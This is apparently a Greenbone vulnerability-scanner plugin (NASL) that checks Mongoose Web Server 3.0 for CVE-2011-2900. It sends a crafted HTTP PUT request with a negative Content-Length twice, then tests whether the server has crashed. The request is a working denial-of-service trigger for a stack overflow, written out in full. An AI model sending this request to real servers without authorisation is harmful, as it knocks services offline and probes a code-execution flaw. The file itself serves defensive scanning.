# Copyright (C) 2011 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:cesanta:mongoose";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802139");
  script_version("2021-07-07T12:08:51+0000");
  script_tag(name:"last_modification", value:"2021-07-07 12:08:51 +0000 (Wed, 07 Jul 2021)");
  script_tag(name:"creation_date", value:"2011-09-07 08:36:57 +0200 (Wed, 07 Sep 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2011-2900");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"Mitigation");

  script_name("Mongoose Web Server Remote Buffer Overflow Vulnerability");

  script_category(ACT_DENIAL);

  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("gb_mongoose_web_server_http_detect.nasl");
  script_mandatory_keys("cesanta/mongoose/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Mongoose Web Server is prone to a remote buffer overflow
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP PUT request and checks if the host is
  still responding.");

  script_tag(name:"insight", value:"The flaw is due to an error in the 'put_dir()' function
  (mongoose.c) when processing HTTP PUT web requests. This can be exploited to cause an assertion
  error or a stack-based buffer overflow.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary code within the context of the affected application. Failed exploit attempts will
  result in a denial-of-service condition.");

  script_tag(name:"affected", value:"Mongoose Web Server version 3.0.");

  script_tag(name:"solution", value:"Apply the patch from the referenced advisory.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/45464");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/68991");
  script_xref(name:"URL", value:"http://www.openwall.com/lists/oss-security/2011/08/03/5");
  script_xref(name:"URL", value:"https://code.google.com/p/mongoose/source/detail?r=025b11b1767a311b0434a385f5115463f6293ce9");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

host = http_host_name(port:port);

req = string('PUT /exp/put.cgi HTTP/1.1\r\n',
             'Host: ', host, '\r\n',
             'Content-Length: -2147483648\r\n\r\n');

res = http_send_recv(port:port, data:req);
res = http_send_recv(port:port, data:req);

req = http_get(item:"/", port:port);
res = http_send_recv(port:port, data:req);

if (!res) {
  security_message(port:port);
  exit(0);
}

exit(99);